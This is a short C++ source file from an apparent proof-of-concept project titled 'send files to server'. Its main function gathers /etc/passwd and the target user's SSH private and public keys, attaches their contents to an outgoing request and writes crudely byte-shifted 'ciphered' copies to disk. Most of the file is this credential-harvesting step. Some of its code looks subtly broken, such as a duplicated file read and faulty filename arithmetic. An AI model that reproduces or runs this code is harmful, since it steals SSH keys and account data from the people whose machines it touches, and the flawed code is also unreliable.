/*
** POC PROJECT, 2022
** send files
** File description:
** send files to server
*/

#include "req.hpp"
#include <fstream>
#include <array>
#include <iostream>
#include <optional>

std::string getFileName(std::string filePath, bool withExtension = true, char seperator = '/')
{
    std::size_t dotPos = filePath.rfind('.');
    std::size_t sepPos = filePath.rfind(seperator);
    if (sepPos != std::string::npos)
    {
        return filePath.substr(sepPos + 1, filePath.size() - (withExtension || dotPos != std::string::npos ? 1 : dotPos));
    }
    return "";
}

std::optional<std::string> get_file(const std::string file_name)
{
    std::ifstream stream(file_name);
    std::string file;
    char c;

    if (!stream.is_open())
    {
        std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
        return std::nullopt;
    }
    while (stream.good())
    {
        std::string line;
        std::getline(stream, line);
        file += line + "\n";
    }
    stream.close();

    stream.open(file_name);
    std::ofstream cipheredFile(getFileName(file_name) + "_ciphered");
    while (stream >> std::noskipws >> c)
    {
        int temp = (c + 7777);
        cipheredFile << (char)temp;
    }
    cipheredFile.close();
    stream.close();
    return file;
}

void get_files_contents(Req &request, std::string username)
{
    std::stringstream path;
    path << "/home/" << username << "/";
    std::string path_str = path.str();
    std::array<std::string, 3> files_names = {"/etc/passwd",
                                              path_str + ".ssh/id_rsa", path_str + ".ssh/id_rsa.pub"};

    for (auto &file_name : files_names)
    {
        auto file_content = get_file(file_name);
        if (auto file_content = get_file(file_name))
            request.push_file_to_req(file_name, *file_content);
    }
}
